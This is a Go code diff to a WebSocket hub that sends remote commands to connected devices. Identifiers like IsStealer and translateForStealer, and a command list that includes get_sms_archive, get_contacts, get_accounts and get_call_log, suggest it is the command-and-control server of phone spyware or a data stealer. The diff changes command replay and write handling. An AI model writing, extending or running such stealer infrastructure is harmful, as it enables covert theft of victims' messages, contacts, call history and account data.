@@ -96,51 +96,6 @@ func (h *Hub) AddDevice(d *DeviceConn) {
 			h.OnDeviceConnect(teamID, deviceID, m, c)
 		}()
 	}
-
-	// Replay any commands that were pending or sent but never acknowledged.
-	// This covers the case where the device reconnected after a dropped WS session.
-	if !d.IsStealer {
-		go h.replayPendingCommands(d)
-	}
-}
-
-// replayPendingCommands re-sends any unacknowledged commands to a freshly connected device.
-func (h *Hub) replayPendingCommands(d *DeviceConn) {
-	rows, err := db.DB.Query(
-		`SELECT id, command, params FROM commands
-		 WHERE device_id = ? AND team_id = ? AND status IN ('pending','sent')
-		 ORDER BY created_at ASC`,
-		d.ID, d.TeamID,
-	)
-	if err != nil {
-		return
-	}
-	defer rows.Close()
-
-	now := time.Now().UTC().Format("2006-01-02 15:04:05")
-	for rows.Next() {
-		var cmdID, command, params string
-		if rows.Scan(&cmdID, &command, &params) != nil {
-			continue
-		}
-		var paramsVal any
-		json.Unmarshal([]byte(params), &paramsVal)
-		msg := map[string]any{
-			"type":       "ws_command",
-			"command_id": cmdID,
-			"cmd_id":     cmdID,
-			"command":    command,
-			"params":     paramsVal,
-			"payload":    params,
-		}
-		if !h.SendToDevice(d.ID, msg) {
-			break
-		}
-		db.DB.Exec(
-			"UPDATE commands SET status = 'sent', sent_at = ? WHERE id = ? AND status IN ('pending','sent')",
-			now, cmdID,
-		)
-	}
 }
 
 func (h *Hub) RemoveDevice(id string) {
@@ -268,10 +223,7 @@ func (h *Hub) SendToDevice(deviceID string, msg map[string]any) bool {
 	data, _ := json.Marshal(outMsg)
 	d.mu.Lock()
 	defer d.mu.Unlock()
-	d.Conn.SetWriteDeadline(time.Now().Add(wsWriteTimeout))
-	err := d.Conn.WriteMessage(websocket.TextMessage, data)
-	d.Conn.SetWriteDeadline(time.Time{})
-	return err == nil
+	return d.Conn.WriteMessage(websocket.TextMessage, data) == nil
 }
 
 func (h *Hub) SendToDeviceIfTeam(deviceID, teamID string, msg map[string]any) bool {
@@ -286,10 +238,7 @@ func (h *Hub) SendToDeviceIfTeam(deviceID, teamID string, msg map[string]any) bo
 	data, _ := json.Marshal(outMsg)
 	d.mu.Lock()
 	defer d.mu.Unlock()
-	d.Conn.SetWriteDeadline(time.Now().Add(wsWriteTimeout))
-	err := d.Conn.WriteMessage(websocket.TextMessage, data)
-	d.Conn.SetWriteDeadline(time.Time{})
-	return err == nil
+	return d.Conn.WriteMessage(websocket.TextMessage, data) == nil
 }
 
 func HandleDeviceWS(w http.ResponseWriter, r *http.Request) {
@@ -885,6 +834,15 @@ func translateForStealer(msg map[string]any) map[string]any {
 func getFloat(m map[string]any, key string) float64 {
 	v, _ := m[key].(float64)
 	return v
+}
+
+func isHTTPOnlyCommand(cmd string) bool {
+	switch cmd {
+	case "get_apps", "apps_list", "get_sms_archive", "get_sms",
+		"get_contacts", "get_accounts", "get_call_log":
+		return true
+	}
+	return false
 }
 
 type wsSession struct {
